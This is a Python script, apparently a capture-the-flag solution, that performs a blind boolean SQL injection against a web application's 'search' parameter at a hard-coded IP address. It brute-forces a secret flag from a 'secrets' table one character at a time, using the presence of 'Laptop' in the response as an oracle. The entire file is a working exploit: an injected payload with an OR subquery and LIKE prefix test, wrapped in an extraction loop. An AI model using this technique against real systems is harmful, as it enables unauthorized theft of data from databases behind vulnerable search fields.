import requests
import string

# Configuration
URL = "http://18.143.150.148:5000/"
session = requests.Session()

# Known parameters
FLAG_LENGTH = 38
FOUND_FLAG = "0DAY{"
# Character set: lowercase, uppercase, digits, and special chars used in flags
CHARSET = string.ascii_letters + string.digits + "_-!@#$%^&*()}"

print(f"[*] Target Length: {FLAG_LENGTH}")
print(f"[*] Starting extraction from: {FOUND_FLAG}")

# Loop until we reach the known length
while len(FOUND_FLAG) < FLAG_LENGTH:
    found_char_in_this_round = False
    
    for char in CHARSET:
        test_prefix = FOUND_FLAG + char
        # The payload uses 'test' to ensure the first part of the query is false
        # We use LIKE with '%' to check the prefix
        payload = f"test' OR ((SELECT(COUNT(*))FROM(secrets)WHERE(data)LIKE('{test_prefix}%')) > 0) OR '1'='0"
        
        params = {'search': payload}
        
        try:
            response = session.get(URL, params=params)
            
            # THE ORACLE: 
            # If the guess is CORRECT, 'Laptop' appears because the subquery is True.
            # If the guess is WRONG, 'Laptop' is missing because 'test' doesn't exist.
            if "Laptop" in response.text:
                FOUND_FLAG += char
                print(f"[+] Found ({len(FOUND_FLAG)}/{FLAG_LENGTH}): {FOUND_FLAG}")
                found_char_in_this_round = True
                break
        except Exception as e:
            print(f"[!] Error: {e}")
            continue
            
    if not found_char_in_this_round:
        print("[!] Character not found. Check if the CHARSET or the Oracle logic needs adjusting.")
        break

print(f"\n[!] Final Flag Found: {FOUND_FLAG}")
